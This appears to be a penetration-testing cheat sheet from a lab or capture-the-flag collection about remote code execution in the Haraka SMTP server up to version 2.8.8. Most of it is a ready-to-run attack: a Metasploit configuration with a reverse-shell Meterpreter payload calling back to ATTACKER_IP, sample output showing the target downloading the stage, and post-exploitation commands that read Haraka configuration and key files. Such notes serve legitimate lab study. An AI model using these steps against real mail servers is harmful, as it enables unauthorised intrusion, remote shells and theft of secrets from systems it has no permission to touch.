# Haraka SMTP Server

Haraka is a Node.js SMTP server. Versions <= 2.8.8 with the attachment plugin enabled are vulnerable to RCE.

---

## Discovery

```bash
# Haraka typically runs on port 25 or 1025
nc TARGET 1025
# 220 redcross ESMTP Haraka 2.8.8 ready
```

---

## CVE: Haraka < 2.8.9 RCE via Attachment Plugin

**Affected Versions:** Haraka <= 2.8.8 with attachment plugin enabled

**CVE:** Not officially assigned, but tracked in Haraka GitHub PR #1606

### Exploit - Metasploit Module

More reliable than the Python script.

```bash
msfconsole

use exploit/linux/smtp/haraka
set RHOST TARGET
set RPORT 1025
set EMAIL_FROM sender@target.htb
set EMAIL_TO admin@target.htb
set SRVHOST ATTACKER_IP
set SRVPORT 8080
set LHOST ATTACKER_IP
set LPORT 9002
set PAYLOAD linux/x64/meterpreter/reverse_tcp

exploit
```

**Example successful output:**

```
[*] Started reverse TCP handler on ATTACKER_IP:9002
[*] Exploiting...
[*] Using URL: http://ATTACKER_IP:8080/xwO7s0Jy5gWD
[*] Sending mail to target server...
[*] Client TARGET (Wget/1.20.1 (linux-gnu)) requested /xwO7s0Jy5gWD
[*] Sending payload to TARGET
[*] Sending stage (3090404 bytes) to TARGET
[*] Meterpreter session 1 opened
```

---

## How the Exploit Works

1. Exploit sends an email with a malicious ZIP attachment
2. The ZIP filename contains shell metacharacters
3. When Haraka's attachment plugin processes the ZIP, it executes the filename as a command
4. This allows arbitrary command execution as the Haraka service user

---

## Troubleshooting

**Python exploit errors:**

```python
# If you see socket errors, modify haraka.py line 94
# Change port from 25 to the actual Haraka port
s = smtplib.SMTP(mailserver, 1025)  # Changed from default 25
```

**Metasploit module fails:**

- Ensure your IP is whitelisted if a firewall is blocking connections
- Try different payload types (staged vs stageless)
- Check if wget/curl is available on target

---

## Post-Exploitation

Haraka runs as a specific user (often `penelope`, `haraka`, or `mail`).

```bash
# Check current user
whoami

# Find Haraka config for additional info
find / -name "haraka" -type d 2>/dev/null
cat /home/*/haraka/config/smtp.ini
cat /home/*/haraka/config/internalcmd_key
```

---

## References

- https://www.exploit-db.com/exploits/41162
- https://github.com/haraka/Haraka/pull/1606
- https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/smtp/haraka.md
